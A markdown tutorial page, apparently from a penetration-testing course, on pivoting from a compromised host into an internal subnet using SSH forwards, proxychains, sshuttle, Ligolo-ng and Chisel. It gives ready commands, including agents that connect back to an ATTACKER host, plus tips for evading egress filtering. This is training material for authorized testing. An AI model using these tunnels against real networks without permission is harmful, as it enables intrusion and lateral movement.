---
title: Pivot into an internal network
slug: pivot-and-tunnel
area: pivoting
module: 12
order: 1
goal: Use a compromised host as a gateway to reach the networks and hosts behind it.
summary: How to pivot — SSH local/dynamic/remote forwards, proxychains, and agent tunnels with Ligolo-ng or Chisel, so your tools reach an internal subnet through a foothold.
prereqs: [A foothold on a dual-homed / internal host, Knowledge of the internal subnet (ip a / route), SSH access or the ability to run a small agent on the pivot]
seeAlso: [tool:ligolo-ng, tool:chisel, tool:sshuttle, tool:pivoting, map:start]
references:
  - HackTricks: tunnelling and port forwarding | https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
  - Ligolo-ng | https://github.com/nicocha30/ligolo-ng
---

A pivot host can see networks you can't. Tunnelling routes your attack traffic through it so your own tools reach internal hosts. First learn what the pivot can reach (`ip a`, `ip route`, `arp -a`), then pick a tunnel.

## SSH port forwarding (when you have SSH)

```bash
ssh -L 8080:INTERNAL_HOST:80 user@PIVOT       # local: reach one internal service
ssh -D 1080 user@PIVOT                         # dynamic: a SOCKS proxy for everything
ssh -R 9001:127.0.0.1:9001 user@PIVOT          # remote: bring a port back to you
```

Then send tools through the SOCKS proxy:

```bash
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn INTERNAL_HOST
proxychains nxc smb 10.10.20.0/24
```

## sshuttle (a VPN-like route, no proxychains)

```bash
sshuttle -r user@PIVOT 10.10.20.0/24
```

## Ligolo-ng (agent tunnel, clean routing)

```bash
# attacker: start the proxy, add a route to the internal subnet
./proxy -selfcert                               # then: interface_create / session / start
sudo ip route add 10.10.20.0/24 dev ligolo
# pivot: run the agent back to you
./agent -connect ATTACKER:11601 -ignore-cert
```

Now your tools hit `10.10.20.0/24` directly — no proxychains.

## Chisel (SOCKS over HTTP, when only web egress works)

```bash
./chisel server -p 8000 --reverse                         # attacker
./chisel client ATTACKER:8000 R:socks                     # pivot -> SOCKS on your 1080
```

## If it fails

- **proxychains hangs/half-works**: use `-sT -Pn` for nmap (no raw sockets over SOCKS) and TCP-only tools; UDP won't traverse a SOCKS proxy.
- **Agent can't connect back**: egress is filtered — move the listener to 443/80, or use Chisel over HTTP.
- **No route to the subnet**: confirm the pivot actually has that interface (`ip a`), and that you added the local route (Ligolo).
- **Windows pivot**: use the Ligolo/Chisel Windows agents, or `netsh interface portproxy` for a simple forward.

## Verify

```bash
proxychains nxc smb INTERNAL_HOST        # or a direct scan if using Ligolo/sshuttle
```

A response from a host you couldn't reach before means the pivot works. Enumerate the new subnet and repeat the engagement from there.
